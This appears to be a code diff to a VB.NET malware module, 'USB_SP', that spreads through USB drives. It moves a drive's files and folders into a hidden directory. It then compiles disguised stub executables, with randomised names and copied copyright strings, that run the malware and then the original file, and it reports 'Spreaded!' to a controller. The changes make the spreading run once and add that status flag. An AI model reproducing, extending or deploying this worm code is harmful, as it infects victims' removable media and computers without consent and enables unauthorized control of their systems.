@@ -19,7 +19,7 @@ Public Class USB_SP
     Public Shared FULLPATH As String
     Public Shared HWID As String
     Public Shared Stub As String = "Imports System.Windows.Forms.Application, System.Diagnostics.Process, System.Reflection" & vbNewLine & "<Assembly: AssemblyCopyright(" & """%C%""" & ")> " & vbNewLine & "Module Nervousness" & vbNewLine & "    Sub Main()" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%A%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%B%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "    End Sub" & vbNewLine & "End Module"
-
+    Public Shared I As Boolean = True
     Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         FULLPATH = FP
@@ -29,17 +29,15 @@ Public Class USB_SP
         Try
             If GTV("USB") = Nothing OrElse GTV("USB") = "Not ready" Then
                 STV("USB", "Waiting USB")
-            Else
             End If
-        Catch ex As Exception
-        End Try
+        Catch : End Try
 
         Run.Start()
     End Sub
 
     Shared Sub Start()
-RE:
-        Thread.Sleep(120000)
+        'RE:
+        ' Thread.Sleep(120000)
 
         Try
             If Not File.Exists(Application.StartupPath + "\IconLib.dll") Then
@@ -64,7 +62,8 @@ RE:
             Catch : End Try
         Next
 
-        GoTo RE
+        Exit Sub
+        'GoTo RE
     End Sub
     Shared Function GetTheFile(ByVal P As String)
         If P.Length = 0 Then
@@ -85,8 +84,9 @@ RE:
                                     IO.File.Move(Files, P & MyDir & "\" & GetFileName(Files))
                                 Catch : End Try
                                 Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Files, EX, True)
-                                If Not GTV("USB") = "Spreaded!" Then
+                                If I = True Then
                                     STV("USB", "Spreaded!")
+                                    I = False
                                 End If
                             End If
                         Else
@@ -95,6 +95,10 @@ RE:
                                 IO.File.Move(Files, P & MyDir & "\" & GetFileName(Files))
                             Catch : End Try
                             Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Files, EX, True)
+                            If I = True Then
+                                STV("USB", "Spreaded!")
+                                I = False
+                            End If
                         End If
                     End If
                 Catch : End Try
@@ -106,6 +110,10 @@ RE:
                     If Not GetFileName(P) = MyDir Then
                         Move(Directorys, P & MyDir & "\" & GetFileName(Directorys))
                         Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Directorys)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Directorys, Nothing, False)
+                        If I = True Then
+                            STV("USB", "Spreaded!")
+                            I = False
+                        End If
                     End If
                 End If
             Catch : End Try
